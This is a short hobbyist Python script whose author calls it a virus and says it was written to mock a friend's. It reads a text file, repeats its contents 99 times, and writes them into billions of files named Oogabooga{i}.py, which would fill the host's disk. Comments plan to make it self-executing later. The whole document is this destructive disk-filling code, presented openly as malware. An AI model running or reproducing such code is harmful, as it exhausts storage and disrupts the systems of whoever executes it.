"""
Produced by Mr. Waltz
date: March 21: RAMADAN SOON Boiss!!!
Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
I literally only made this to shame malek for his horrible "Ooga Booga" virus.
"""


# a virus like this should be self executable so add stuff for that later...
# Make it cooler you stupid nerd!
#
# Above are mearly notes for myself, please ignore.
import os
import sys

path = "/"
path2 = "C:"
f = open("pac.txt", "r")
the_package = f.read() * 99

for i in range(1,9999999999):
    with open(f"Oogabooga{i}.py", 'w') as file:
        file.write(the_package)
